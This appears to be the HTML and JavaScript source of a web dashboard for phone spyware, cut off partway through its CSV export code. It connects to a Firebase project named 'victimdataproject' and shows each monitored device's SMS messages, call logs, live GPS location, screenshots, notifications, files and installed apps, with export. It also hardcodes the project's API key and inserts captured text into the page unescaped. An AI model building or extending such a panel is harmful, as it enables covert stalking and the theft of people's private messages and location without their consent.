<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Device Monitoring</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="anonymous"/>
    <style>
        body {
            background-color: #f8f9fa; /* Light theme background */
        }
        .sidebar {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            z-index: 100;
            padding: 48px 0 0; /* Height of navbar */
            box-shadow: inset -1px 0 0 rgba(0, 0, 0, .1);
            background-color: #fff; /* White sidebar */
        }
        .sidebar-sticky {
            position: relative;
            top: 0;
            height: calc(100vh - 48px);
            padding-top: .5rem;
            overflow-x: hidden;
            overflow-y: auto; /* Scrollable contents if viewport is shorter than content. */
        }
        .nav-link {
            color: #333; /* Darker text for nav links */
        }
        .nav-link.active, .nav-link:hover {
            color: #0d6efd; /* Bootstrap primary color */
        }
        .nav-link .fas, .nav-link .far, .nav-link .fab {
            margin-right: 8px;
        }
        .topbar {
            background-color: #fff;
            border-bottom: 1px solid #dee2e6;
        }
        .main-content {
            margin-left: 220px; /* Adjust if sidebar width changes */
            padding: 20px;
        }
        .content-section {
            display: none; /* Hidden by default, shown by JS */
            padding-top: 20px;
        }
        .content-section.active {
            display: block;
        }
        .card-body .table th, .card-body .table td {
            vertical-align: middle;
        }
        #map { height: 400px; }
        .loading-spinner, .no-data-message {
            text-align: center;
            padding: 20px;
            font-size: 1.2em;
            color: #6c757d;
        }
        .screenshot-img {
            max-width: 200px;
            max-height: 200px;
            margin: 5px;
            border: 1px solid #ddd;
            cursor: pointer;
        }
        .editable-alias {
            display: flex;
            align-items: center;
        }
        .editable-alias input {
            margin-right: 5px;
        }
        /* Responsive adjustments */
        @media (max-width: 767.98px) {
            .sidebar {
                position: static;
                width: 100%;
                height: auto;
                box-shadow: none;
                padding-top: 0;
            }
            .sidebar-sticky {
                height: auto;
                padding-top: 0;
            }
            .main-content {
                margin-left: 0;
            }
            .topbar .navbar-brand {
                margin-left: 1rem;
            }
        }
        .login-container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-form {
            width: 100%;
            max-width: 400px;
            padding: 25px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <!-- Login View -->
    <div id="loginView" class="login-container">
        <div class="login-form">
            <h2 class="text-center mb-4">Admin Panel Login</h2>
            <form id="loginForm">
                <div class="mb-3">
                    <label for="email" class="form-label">Email address</label>
                    <input type="email" class="form-control" id="email" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <div id="loginError" class="text-danger mt-2"></div>
            </form>
        </div>
    </div>

    <!-- Dashboard View -->
    <div id="dashboardView" style="display: none;">
        <nav class="navbar navbar-expand-lg navbar-light topbar fixed-top">
            <div class="container-fluid">
                <a class="navbar-brand" href="#">Admin Panel</a>
                <div class="ms-auto d-flex align-items-center">
                    <div class="me-3">
                        <label for="deviceSelector" class="form-label-sm me-1">Device:</label>
                        <select id="deviceSelector" class="form-select form-select-sm" style="width: auto; display: inline-block;"></select>
                    </div>
                    <span id="adminEmail" class="navbar-text me-3"></span>
                    <button id="logoutButton" class="btn btn-outline-danger btn-sm">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </button>
                </div>
            </div>
        </nav>

        <div class="container-fluid">
            <div class="row">
                <nav id="sidebarMenu" class="col-md-3 col-lg-2 d-md-block sidebar collapse">
                    <div class="sidebar-sticky pt-3">
                        <ul class="nav flex-column nav-pills">
                            <li class="nav-item">
                                <a class="nav-link active" href="#" data-section="overview">
                                    <i class="fas fa-tachometer-alt"></i> Device Overview
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="messages">
                                    <i class="fas fa-comments"></i> Messages
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="calls">
                                    <i class="fas fa-phone-alt"></i> Call Logs
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="apps">
                                    <i class="fas fa-th-large"></i> Installed Apps
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="battery">
                                    <i class="fas fa-battery-full"></i> Battery Info
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="gps">
                                    <i class="fas fa-map-marker-alt"></i> GPS Location
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="files">
                                    <i class="fas fa-folder"></i> File Logs
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="screenshots">
                                    <i class="fas fa-camera"></i> Screenshots
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="notifications">
                                    <i class="fas fa-bell"></i> Notifications
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#" data-section="device_info">
                                    <i class="fas fa-info-circle"></i> Device Info
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>

                <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4 main-content">
                    <div id="contentArea">
                        <!-- Sections will be loaded here -->
                        <div id="overview" class="content-section active">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Device Overview</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="overview"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="overviewContent" class="row">
                                <div class="col-md-6 mb-3">
                                    <div class="card">
                                        <div class="card-header">Device Alias</div>
                                        <div class="card-body editable-alias">
                                            <input type="text" id="deviceAliasInput" class="form-control form-control-sm" placeholder="Enter device alias">
                                            <button id="saveAliasButton" class="btn btn-sm btn-primary">Save</button>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <div class="card">
                                        <div class="card-header">Status</div>
                                        <div class="card-body">
                                            <p><strong>Online Status:</strong> <span id="deviceOnlineStatus">-</span></p>
                                            <p><strong>Last Seen:</strong> <span id="deviceLastSeen">-</span></p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div id="messages" class="content-section">
                             <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Messages</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="messages"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="messagesContent"></div>
                        </div>

                        <div id="calls" class="content-section">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Call Logs</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="calls"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="callsContent"></div>
                        </div>

                        <div id="apps" class="content-section">
                             <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Installed Apps</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="apps"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="appsContent"></div>
                        </div>

                        <div id="battery" class="content-section">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Battery Info</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="battery"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="batteryContent"></div>
                        </div>

                        <div id="gps" class="content-section">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">GPS Location</h1>
                                <!-- No CSV export for map view directly, maybe for coordinates list if applicable -->
                            </div>
                            <div id="map"></div>
                            <div id="gpsContentDetails" class="mt-2"></div>
                        </div>

                        <div id="files" class="content-section">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">File Logs</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="files"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="filesContent"></div>
                        </div>

                        <div id="screenshots" class="content-section">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Screenshots</h1>
                                <!-- Exporting images as CSV is not standard, perhaps a list of URLs -->
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="screenshots_urls"><i class="fas fa-download"></i> Export URLs CSV</button>
                            </div>
                            <div id="screenshotsContent" class="d-flex flex-wrap"></div>
                        </div>

                        <div id="notifications" class="content-section">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Notifications</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="notifications"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="notificationsContent"></div>
                        </div>

                        <div id="device_info" class="content-section">
                            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                                <h1 class="h2">Device Info</h1>
                                <button class="btn btn-sm btn-outline-secondary export-btn" data-section="device_info"><i class="fas fa-download"></i> Export CSV</button>
                            </div>
                            <div id="deviceInfoContent"></div>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </div>

    <!-- Modal for viewing full size image -->
    <div class="modal fade" id="imageModal" tabindex="-1" aria-labelledby="imageModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="imageModalLabel">Screenshot</h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body text-center">
            <img id="fullSizeImage" src="" class="img-fluid" alt="Full size screenshot">
          </div>
        </div>
      </div>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin="anonymous"></script>

    <script type="module">
        // Firebase v9 Modular SDK
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, set, get, update, off } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.firebasestorage.app",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // Global state
        let currentUid = null;
        let activeFirebaseListeners = []; // To store { ref, type, callback } or unsubscribe functions
        let leafletMap = null;
        let mapMarker = null;
        let currentDataForExport = {}; // Stores data for each section for CSV export

        // DOM Elements
        const loginView = document.getElementById('loginView');
        const dashboardView = document.getElementById('dashboardView');
        const loginForm = document.getElementById('loginForm');
        const loginError = document.getElementById('loginError');
        const adminEmailEl = document.getElementById('adminEmail');
        const logoutButton = document.getElementById('logoutButton');
        const deviceSelector = document.getElementById('deviceSelector');
        const contentArea = document.getElementById('contentArea');
        const sidebarLinks = document.querySelectorAll('.sidebar .nav-link');
        const exportButtons = document.querySelectorAll('.export-btn');

        // --- Utility Functions ---
        function formatTimestamp(timestamp) {
            if (!timestamp) return 'N/A';
            // Assuming timestamp is in milliseconds
            return new Date(timestamp).toLocaleString();
        }

        function showLoading(elementId) {
            const el = document.getElementById(elementId);
            if (el) {
                el.innerHTML = `<div class="loading-spinner"><div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div></div>`;
            }
        }

        function showNoData(elementId, message = "No data found.") {
            const el = document.getElementById(elementId);
            if (el) {
                el.innerHTML = `<div class="no-data-message">${message}</div>`;
            }
        }

        function renderTable(elementId, data, columns) {
            const container = document.getElementById(elementId);
            if (!data || data.length === 0) {
                showNoData(elementId);
                currentDataForExport[elementId.replace('Content', '')] = [];
                return;
            }

            let tableHTML = '<div class="table-responsive"><table class="table table-striped table-sm">';
            tableHTML += '<thead><tr>';
            columns.forEach(col => tableHTML += `<th>${col.header}</th>`);
            tableHTML += '</tr></thead><tbody>';

            const exportableData = [];
            data.forEach(item => {
                tableHTML += '<tr>';
                const rowData = {};
                columns.forEach(col => {
                    let value = item[col.key];
                    if (col.formatter) {
                        value = col.formatter(value, item);
                    }
                    tableHTML += `<td>${value === undefined || value === null ? '-' : value}</td>`;
                    rowData[col.header] = value === undefined || value === null ? '' : value;
                });
                tableHTML += '</tr>';
                exportableData.push(rowData);
            });

            tableHTML += '</tbody></table></div>';
            container.innerHTML = tableHTML;
            currentDataForExport[elementId.replace('Content', '')] = exportableData;
        }
        
        function renderKeyValueList(elementId, data) {
            const container = document.getElementById(elementId);
            if (!data || Object.keys(data).length === 0) {
                showNoData(elementId);
                currentDataForExport[elementId.replace('Content', '')] = [];
                return;
            }
            let listHTML = '<ul class="list-group">';
            const exportableData = [];
            for (const key in data) {
                if (data.hasOwnProperty(key)) {
                    const value = (typeof data[key] === 'object') ? JSON.stringify(data[key]) : data[key];
                    listHTML += `<li class="list-group-item d-flex justify-content-between align-items-center">
                                    <strong>${key.charAt(0).toUpperCase() + key.slice(1)}:</strong>
                                    <span>${value}</span>
                                 </li>`;
                    exportableData.push({ Key: key, Value: value });
                }
            }
            listHTML += '</ul>';
            container.innerHTML = listHTML;
            currentDataForExport[elementId.replace('Content', '')] = exportableData;
        }

        // --- Firebase Listeners Management ---
        function detachAllFirebaseListeners() {
            activeFirebaseListeners.forEach(unsubscribe => unsubscribe());
            activeFirebaseListeners = [];
        }

        function addFirebaseListener(path, callback) {
            const dataRef = ref(db, path);
            const unsubscribe = onValue(dataRef, callback, (error) => {
                console.error(`Error listening to ${path}:`, error);
                // Optionally show error in UI for that section
            });
            activeFirebaseListeners.push(unsubscribe);
        }

        // --- Auth Functions ---
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            loginError.textContent = '';

            signInWithEmailAndPassword(auth, email, password)
                .then((userCredential) => {
                    // Signed in
                })
                .catch((error) => {
                    loginError.textContent = error.message;
                });
        });

        logoutButton.addEventListener('click', () => {
            firebaseSignOut(auth).catch(error => console.error("Logout error", error));
        });

        onAuthStateChanged(auth, (user) => {
            if (user) {
                loginView.style.display = 'none';
                dashboardView.style.display = 'block';
                adminEmailEl.textContent = user.email;
                fetchDeviceUIDs();
                initializeMap();
            } else {
                loginView.style.display = 'flex';
                dashboardView.style.display = 'none';
                adminEmailEl.textContent = '';
                currentUid = null;
                deviceSelector.innerHTML = '<option>No devices</option>';
                detachAllFirebaseListeners();
                clearAllSections(); // Clear data from UI
            }
        });
        
        function clearAllSections() {
            const contentSections = document.querySelectorAll('.content-section > div[id$="Content"], .content-section > div[id$="ContentDetails"]');
            contentSections.forEach(el => el.innerHTML = '');
            if (leafletMap && mapMarker) {
                leafletMap.removeLayer(mapMarker);
                mapMarker = null;
            }
            document.getElementById('deviceAliasInput').value = '';
            document.getElementById('deviceOnlineStatus').textContent = '-';
            document.getElementById('deviceLastSeen').textContent = '-';
        }


        // --- Device Management ---
        async function fetchDeviceUIDs() {
            const devicesRef = ref(db, 'devices');
            try {
                const snapshot = await get(devicesRef);
                if (snapshot.exists()) {
                    const uids = Object.keys(snapshot.val());
                    populateDeviceSelector(uids);
                    if (uids.length > 0) {
                        // Select the first device by default or a previously selected one
                        const lastSelectedUid = localStorage.getItem('lastSelectedUid');
                        if (lastSelectedUid && uids.includes(lastSelectedUid)) {
                             deviceSelector.value = lastSelectedUid;
                        } else {
                             deviceSelector.value = uids[0];
                        }
                        handleDeviceChange(); 
                    } else {
                        deviceSelector.innerHTML = '<option>No devices found</option>';
                        clearAllSections();
                    }
                } else {
                    deviceSelector.innerHTML = '<option>No devices found</option>';
                    clearAllSections();
                }
            } catch (error) {
                console.error("Error fetching device UIDs:", error);
                deviceSelector.innerHTML = '<option>Error loading devices</option>';
            }
        }

        function populateDeviceSelector(uids) {
            deviceSelector.innerHTML = ''; // Clear existing options
            if (uids.length === 0) {
                deviceSelector.innerHTML = '<option>No devices found</option>';
                return;
            }
            uids.forEach(uid => {
                const option = document.createElement('option');
                option.value = uid;
                option.textContent = uid.substring(0, 8) + '...'; // Display a shortened UID or fetch alias later
                deviceSelector.appendChild(option);
            });
            // Fetch aliases for better display names if time permits
        }

        deviceSelector.addEventListener('change', handleDeviceChange);

        function handleDeviceChange() {
            const selectedUid = deviceSelector.value;
            if (selectedUid && selectedUid !== "No devices found" && selectedUid !== "Error loading devices") {
                currentUid = selectedUid;
                localStorage.setItem('lastSelectedUid', currentUid);
                detachAllFirebaseListeners(); // Remove listeners for old UID
                loadDataForCurrentDevice(); // Load all data for new UID
            } else {
                currentUid = null;
                detachAllFirebaseListeners();
                clearAllSections();
            }
        }
        
        function loadDataForCurrentDevice() {
            if (!currentUid) return;

            // Load data for the currently active section first
            const activeSectionId = document.querySelector('.sidebar .nav-link.active').dataset.section;
            loadSectionData(activeSectionId);
            
            // Optionally, pre-load other sections or load them on demand when tab is clicked
            // For this example, we'll set up listeners for all sections for real-time updates.
            setupAllFirebaseListeners();
        }

        function setupAllFirebaseListeners() {
            if (!currentUid) return;
            
            // Device Overview specific listeners
            addFirebaseListener(`devices/${currentUid}/alias`, snapshot => {
                const alias = snapshot.val();
                document.getElementById('deviceAliasInput').value = alias || '';
                currentDataForExport['overview_alias'] = [{ Alias: alias || '' }];
            });
            addFirebaseListener(`devices/${currentUid}/lastSeen`, snapshot => {
                const lastSeen = snapshot.val();
                document.getElementById('deviceLastSeen').textContent = formatTimestamp(lastSeen);
                // Update online status based on lastSeen
                const now = Date.now();
                const fiveMinutes = 5 * 60 * 1000;
                if (lastSeen && (now - lastSeen < fiveMinutes)) {
                    document.getElementById('deviceOnlineStatus').innerHTML = '<span class="badge bg-success">Online</span>';
                } else {
                    document.getElementById('deviceOnlineStatus').innerHTML = '<span class="badge bg-danger">Offline</span>';
                }
                currentDataForExport['overview_status'] = [{ LastSeen: formatTimestamp(lastSeen), Status: (lastSeen && (now - lastSeen < fiveMinutes)) ? 'Online' : 'Offline' }];
            });
            // Generic listener setup for other sections
            loadSectionData("messages");
            loadSectionData("calls");
            loadSectionData("apps");
            loadSectionData("battery");
            loadSectionData("gps");
            loadSectionData("files");
            loadSectionData("screenshots");
            loadSectionData("notifications");
            loadSectionData("device_info");
        }


        // --- Section Data Loaders ---
        const sectionLoaders = {
            'overview': loadDeviceOverview,
            'messages': loadMessages,
            'calls': loadCallLogs,
            'apps': loadInstalledApps,
            'battery': loadBatteryInfo,
            'gps': loadGpsLocation,
            'files': loadFileLogs,
            'screenshots': loadScreenshots,
            'notifications': loadNotifications,
            'device_info': loadDeviceInfo,
        };

        function loadSectionData(sectionId) {
            if (!currentUid) {
                // Show "Please select a device" or similar in the specific section
                const contentElId = sectionId === 'overview' ? 'overviewContent' : `${sectionId}Content`;
                if (document.getElementById(contentElId)) {
                     showNoData(contentElId, "Please select a device.");
                } else if (sectionId === 'gps' && document.getElementById('gpsContentDetails')) {
                     showNoData('gpsContentDetails', "Please select a device.");
                }
                return;
            }
            const loader = sectionLoaders[sectionId];
            if (loader) {
                const contentElId = sectionId === 'overview' ? 'overviewContent' : `${sectionId}Content`;
                // For overview, parts are handled by individual listeners.
                // For other sections, show loading spinner before data fetch.
                if (sectionId !== 'overview') {
                    showLoading(contentElId);
                    if (sectionId === 'gps') showLoading('gpsContentDetails');
                }
                loader(); // This will setup its own onValue listener
            }
        }
        
        function loadDeviceOverview() {
            // Data for alias and lastSeen/status is handled by their specific listeners in setupAllFirebaseListeners
            // This function could load other overview-specific data if needed.
            // For now, this function is mostly a placeholder as individual parts update.
        }

        document.getElementById('saveAliasButton').addEventListener('click', () => {
            if (!currentUid) return;
            const newAlias = document.getElementById('deviceAliasInput').value.trim();
            const aliasRef = ref(db, `devices/${currentUid}/alias`);
            set(aliasRef, newAlias)
                .then(() => alert('Alias saved!'))
                .catch(err => alert('Error saving alias: ' + err.message));
        });

        function loadMessages() {
            addFirebaseListener(`devices/${currentUid}/messages`, (snapshot) => {
                const data = snapshot.val();
                const messagesArray = data ? Object.values(data) : [];
                renderTable('messagesContent', messagesArray.sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0)), [
                    { header: 'Date', key: 'timestamp', formatter: formatTimestamp },
                    { header: 'Type', key: 'type' }, // e.g., SMS, MMS, INBOX, SENT
                    { header: 'From/To', key: 'address' },
                    { header: 'Body', key: 'body' },
                ]);
            });
        }

        function loadCallLogs() {
            addFirebaseListener(`devices/${currentUid}/calls`, (snapshot) => {
                const data = snapshot.val();
                const callsArray = data ? Object.values(data) : [];
                renderTable('callsContent', callsArray.sort((a,b) => (b.date || 0) - (a.date || 0)), [
                    { header: 'Date', key: 'date', formatter: formatTimestamp },
                    { header: 'Number', key: 'number' },
                    { header: 'Type', key: 'type' }, // e.g., INCOMING, OUTGOING, MISSED
                    { header: 'Duration', key: 'duration', formatter: (d) => `${d}s` },
                ]);
            });
        }
        
        function loadInstalledApps() {
            addFirebaseListener(`devices/${currentUid}/apps`, (snapshot) => {
                const data = snapshot.val();
                const appsArray = data ? Object.values(data) : [];
                renderTable('appsContent', appsArray.sort((a,b) => a.appName?.localeCompare(b.appName)), [
                    { header: 'App Name', key: 'appName' },
                    { header: 'Package Name', key: 'packageName' },
                    { header: 'Version', key: 'versionName' },
                    // { header: 'Install Date', key: 'firstInstallTime', formatter: formatTimestamp },
                ]);
            });
        }

        function loadBatteryInfo() {
            addFirebaseListener(`devices/${currentUid}/battery`, (snapshot) => {
                const data = snapshot.val();
                // Battery data is usually a single object, not an array
                if (data) {
                    const batteryData = [
                        { Key: 'Level', Value: `${data.level || 'N/A'}%` },
                        { Key: 'Status', Value: data.status || 'N/A' }, // e.g., Charging, Discharging
                        { Key: 'Health', Value: data.health || 'N/A' },
                        { Key: 'Temperature', Value: data.temperature ? `${data.temperature}°C` : 'N/A' },
                    ];
                    renderKeyValueList('batteryContent', data); // Use renderKeyValueList for battery object
                    currentDataForExport['battery'] = batteryData;
                } else {
                    showNoData('batteryContent');
                    currentDataForExport['battery'] = [];
                }
            });
        }
        
        function initializeMap() {
            if (!leafletMap && document.getElementById('map')) {
                 leafletMap = L.map('map').setView([0, 0], 2); // Default view
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                 }).addTo(leafletMap);
            }
        }

        function loadGpsLocation() {
            addFirebaseListener(`devices/${currentUid}/gps`, (snapshot) => {
                const data = snapshot.val();
                const detailsContainer = document.getElementById('gpsContentDetails');
                if (data && data.latitude && data.longitude) {
                    const latLng = [data.latitude, data.longitude];
                    if (!leafletMap) initializeMap(); // Ensure map is initialized

                    if (leafletMap) { // Check again after potential initialization
                        leafletMap.setView(latLng, 15);
                        if (mapMarker) {
                            mapMarker.setLatLng(latLng);
                        } else {
                            mapMarker = L.marker(latLng).addTo(leafletMap);
                        }
                        mapMarker.bindPopup(`<b>Location</b><br>Lat: ${data.latitude}<br>Lng: ${data.longitude}<br>Time: ${formatTimestamp(data.timestamp)}<br>Accuracy: ${data.accuracy || 'N/A'}m`).openPopup();
                    }
                    
                    let detailsHTML = `<ul class="list-group mt-2">
                        <li class="list-group-item">Latitude: ${data.latitude}</li>
                        <li class="list-group-item">Longitude: ${data.longitude}</li>
                        <li class="list-group-item">Timestamp: ${formatTimestamp(data.timestamp)}</li>
                        <li class="list-group-item">Accuracy: ${data.accuracy || 'N/A'} m</li>
                    </ul>`;
                    detailsContainer.innerHTML = detailsHTML;
                    currentDataForExport['gps'] = [data]; // For CSV export
                } else {
                    if (mapMarker && leafletMap) {
                        leafletMap.removeLayer(mapMarker);
                        mapMarker = null;
                    }
                    showNoData('gpsContentDetails', 'No GPS data available.');
                    currentDataForExport['gps'] = [];
                }
            });
        }

        function loadFileLogs() {
             addFirebaseListener(`devices/${currentUid}/files`, (snapshot) => {
                const data = snapshot.val();
                const filesArray = data ? Object.values(data) : [];
                renderTable('filesContent', filesArray.sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0)), [
                    { header: 'Name', key: 'name' },
                    { header: 'Path', key: 'path' },
                    { header: 'Size', key: 'size', formatter: (s) => s ? `${(s/1024).toFixed(2)} KB` : 'N/A' },
                    { header: 'Modified', key: 'lastModified', formatter: formatTimestamp },
                ]);
            });
        }

        function loadScreenshots() {
            addFirebaseListener(`devices/${currentUid}/screenshots`, (snapshot) => {
                const data = snapshot.val();
                const container = document.getElementById('screenshotsContent');
                const urlsForExport = [];
                if (data) {
                    const screenshotsArray = Object.values(data).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));
                    container.innerHTML = ''; // Clear previous
                    if (screenshotsArray.length === 0) {
                        showNoData('screenshotsContent');
                        currentDataForExport['screenshots_urls'] = [];
                        return;
                    }
                    screenshotsArray.forEach(ss => {
                        if (ss.url) {
                            const img = document.createElement('img');
                            img.src = ss.url;
                            img.alt = `Screenshot ${formatTimestamp(ss.timestamp)}`;
                            img.title = `Screenshot ${formatTimestamp(ss.timestamp)}`;
                            img.className = 'screenshot-img img-thumbnail';
                            img.setAttribute('data-bs-toggle', 'modal');
                            img.setAttribute('data-bs-target', '#imageModal');
                            img.onclick = () => {
                                document.getElementById('fullSizeImage').src = ss.url;
                            };
                            container.appendChild(img);
                            urlsForExport.push({ url: ss.url, timestamp: formatTimestamp(ss.timestamp) });
                        }
                    });
                    currentDataForExport['screenshots_urls'] = urlsForExport;
                } else {
                    showNoData('screenshotsContent');
                    currentDataForExport['screenshots_urls'] = [];
                }
            });
        }

        function loadNotifications() {
            addFirebaseListener(`devices/${currentUid}/notifications`, (snapshot) => {
                const data = snapshot.val();
                const notificationsArray = data ? Object.values(data) : [];
                renderTable('notificationsContent', notificationsArray.sort((a,b) => (b.postTime || 0) - (a.postTime || 0)), [
                    { header: 'Time', key: 'postTime', formatter: formatTimestamp },
                    { header: 'App', key: 'packageName' }, // Or an appName if available
                    { header: 'Title', key: 'title' },
                    { header: 'Text', key: 'text' },
                ]);
            });
        }

        function loadDeviceInfo() {
            addFirebaseListener(`devices/${currentUid}/info`, (snapshot) => {
                const data = snapshot.val();
                renderKeyValueList('deviceInfoContent', data);
            });
        }
        
        // --- Sidebar Navigation ---
        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                sidebarLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');

                document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
                const sectionId = link.dataset.section;
                document.getElementById(sectionId).classList.add('active');
                
                // Load data for this section if not already loaded or if a specific refresh is needed
                // Firebase onValue listeners should keep it up-to-date, but this ensures view is populated
                loadSectionData(sectionId); 
                
                // Special handling for map resize if it was hidden
                if (sectionId === 'gps' && leafletMap) {
                    setTimeout(() => leafletMap.invalidateSize(), 100);
                }
            });
        });

        // --- CSV Export ---
        function exportToCsv(filename, rows) {
            if (!rows || rows.length === 0) {
                alert("No data to export for this section.");
                return;
            }

            const processRow = (rowArray) => {
                let finalVal = '';
                for (let j = 0; j < rowArray.length; j++) {
                    let innerValue = rowArray[j] === null || rowArray[j] === undefined ? '' : String(rowArray[j]);
                    if (rowArray[j] instanceof Date) {
                        innerValue = rowArray[j].toLocaleString();
                    }
                    let result = innerValue.replace(/"/g, '""'); // Escape double quotes
                    if (result.search(/("|,|\n)/g) >= 0)
                        result = '"' + result + '"';
                    if (j > 0)
                        finalVal += ',';
                    finalVal += result;
                }
                return finalVal + '\n';
            };

            let csvFile = '';
            const headers = Object.keys(rows[0]);
            csvFile += processRow(headers);

            for (const item of rows) {
                const rowData = headers.map(header => item[header]);
                csvFile += processRow(rowData);
            }

            const blob = new Blob([csvFile], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement("a");
